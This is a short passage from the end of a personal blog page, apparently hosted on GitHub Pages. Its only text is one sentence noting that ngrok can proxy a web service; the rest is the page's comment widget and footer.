</span></code></pre><p>which can use <a rel="nofollow noreferrer" href=https://ngrok.com/>ngrok</a> for proxy our web service.</article><div class=giscus></div><script async crossorigin data-category=Announcements data-category-id=DIC_kwDOKyFr1M4Cjcdy data-emit-metadata=0 data-input-position=bottom data-lang=en data-loading=lazy data-mapping=pathname data-reactions-enabled=1 data-repo=curtainp/curtainp.github.io data-repo-id=R_kgDOKyFr1A data-strict=0 data-theme=preferred_color_scheme src=https://giscus.app/client.js></script></div><footer><div class=copyright><p>© 2024 curtain</div></footer></main></div><script src=/js/lightense.min.js></script><script src=/js/main.js></script>